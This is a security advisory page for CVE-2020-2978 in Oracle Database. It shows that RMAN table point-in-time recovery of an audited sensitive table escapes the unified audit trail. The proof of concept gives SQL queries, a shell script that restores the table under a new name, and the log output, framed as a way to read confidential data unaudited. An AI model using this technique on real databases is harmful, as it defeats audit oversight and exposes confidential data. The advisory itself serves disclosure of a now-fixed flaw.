---
title: Oracle RMAN Missing Auditing
url: https://cxsecurity.com/issue/WLB-2023050017
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-05-07
fetch_date: 2025-10-04T11:37:12.765337
---

# Oracle RMAN Missing Auditing

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Oracle RMAN Missing Auditing** **2023-05-06 / 2023-05-07**  Credit:  **[Emad Al-Mousa](https://cxsecurity.com/author/Emad%2BAl-Mousa/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2020-2978](https://cxsecurity.com/cveshow/CVE-2020-2978/ "Click to see CVE-2020-2978")**  CWE: **[NVD-CWE-noinfo](https://cxsecurity.com/cwe/NVD-CWE-noinfo "NVD-CWE-noinfo")**  CVSS Base Score: **4/10**  Impact Subscore: **2.9/10**  Exploitability Subscore: **8/10**  Exploit range: **Remote**  Attack complexity: **Low**  Authentication: **Single time**  Confidentiality impact: **None**  Integrity impact: **Partial**  Availability impact: **None** | |

Title: CVE-2020-2978 - Oracle RMAN Audit table point in time recovery not recorded
Product: Database
Manufacturer: Oracle
Affected Version(s): 12.1.0.2, 12.2.0.1, 18c, 19c
Tested Version(s): 19c
Risk Level: Medium
Score: 4.1
Solution Status: Fixed
CVE Reference: CVE-2020-2978
Author of Advisory: Emad Al-Mousa
Overview:
Audit failure is a security weakness in software product especially if a security audit is in-place to detect a certain operation. Oracle RMAN is
a database Recovery Manager utility for backup and restore operations, so any security weakness/vulnerability can be exploited by insider threat or
external attacker to view confidential data in unauthorized manner.
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
Vulnerability Details:
The scope of this security research is to detect if a database administrator tried to restore a "sensitive table" (already in-place auditing is configured against SELECT statements against this sensitive table).
The following research illustrates that despite RMAN operations are audited by “default” in pure “Unified Auditing” mode, the table point of time recovery activity/action was not logged in the audit logs.
As a result, any trails for future forensic investigation or real time security operations monitoring for activities against highly confidential sensitive table will not be met.
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
Proof of Concept (PoC):
// I will check first if Unified Auditing feature is enabled in an Oracle database system:
SQL> select value from v$option where parameter ='Unified Auditing';
VALUE
----------------------------------------------------------------
TRUE
SQL> select \* from DBA\_AUDIT\_MGMT\_CONFIG\_PARAMS where PARAMETER\_NAME = 'AUDIT WRITE MODE';
PARAMETER\_NAME
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
PARAMETER\_VALUE
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
AUDIT\_TRAIL
----------------------------
AUDIT WRITE MODE
IMMEDIATE WRITE MODE
UNIFIED AUDIT TRAIL
// I will create linux shell script to restore a sensitive database table with different name , you will need to access the Linux OS as DBA linux account
for the exploit to work ....the sensitive table is called "dummy" under schema called "DBA" and the attacker will restore it with different name --->
dummy\_55:
touch /tmp/dbtest/resotre.sh
chmod 700 /tmp/dbtest/resotre.sh
vi /tmp/dbtest/resotre.sh
#!/bin/sh
export ORACLE\_SID=dbtest
export ORACLE\_HOME=/orcl/dbtest/product/18.3
export RMAN\_LOG\_FILE=/tmp/dbtest/aux\_db/db\_restore.log
RMAN=$ORACLE\_HOME/bin/rman
CMD\_STR="
ORACLE\_HOME=$ORACLE\_HOME
export ORACLE\_HOME
ORACLE\_SID=$ORACLE\_SID
export ORACLE\_SID
$RMAN target \/ msglog $RMAN\_LOG\_FILE append << EOF
connect CATALOG $RCVCAT\_CONNECT\_STR
run {
recover table dba.dummy
#until scn 56330407409
until time \"to\_date('23-JAN-2020 08:00:00','DD-MON-YYYY HH24:MI:SS')\"
auxiliary destination '/tmp/dbtest/aux\_db'
remap table dba.dummy:dummy\_55;
}
EOF
"
/usr/bin/sh -c "$CMD\_STR" >> $RMAN\_LOG\_FILE
// then run the shell script:
/tmp/dbtest/resotre.sh
// Log File /tmp/dbtest/aux\_db/db\_restore.log shows the restore is successful:
auxiliary instance file /tmp/dbtest/aux\_db/JTVB\_PITR\_dbtest/onlinelog/o1\_mf\_1\_h2lopldq\_.log deleted
auxiliary instance file /tmp/dbtest/aux\_db/JTVB\_PITR\_dbtest/datafile/o1\_mf\_ts\_user\_\_h2locvjr\_.dbf deleted
auxiliary instance file /tmp/dbtest/aux\_db/dbtest/datafile/o1\_mf\_sysaux\_h2lncb1c\_.dbf deleted
auxiliary instance file /tmp/dbtest/aux\_db/dbtest/datafile/o1\_mf\_ts\_undo\_\_h2lnlrw7\_.dbf deleted
auxiliary instance file /tmp/dbtest/aux\_db/dbtest/datafile/o1\_mf\_system\_h2lncb14\_.dbf deleted
auxiliary instance file /tmp/dbtest/aux\_db/dbtest/datafile/o1\_mf\_system\_h2lncbvp\_.dbf deleted
auxiliary instance file /tmp/dbtest/aux\_db/dbtest/controlfile/o1\_mf\_h2ln7ftc\_.ctl deleted
auxiliary instance file tspitr\_jtvb\_19868.dmp deleted
Finished recover at 01/23/2020-11:19:30
RMAN> RMAN>
Recovery Manager complete.
// you can now access the sensitive table and query data:
sqlplus / as sysdba
SQL> select \* from dba.dummy\_55;
// Checking the unified audit trail:
SQL> select EVENT\_TIMESTAMP, ACTION\_NAME, RMAN\_SESSION\_STAMP, RMAN\_OPERATION,RMAN\_OPERATION,RMAN\_OBJECT\_TYPE
from unified\_audit\_trail where ACTION\_NAME like '%RMAN%' order by 1;
The RMAN session is logged in the audit table, but there is NO details of what kind of RMAN operation took place ?!
Conclusion:
SystemAdmin/Attacker can view sensitive data without being audited which will impact forensic investigation, and threat detection.
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
References:
https://www.oracle.com/security-alerts/cpujul2020.html
https://nvd.nist.gov/vuln/detail/CVE-2020-2978
https://databasesecurityninja.wordpress.com/2020/12/01/cve-2020-2978-rma...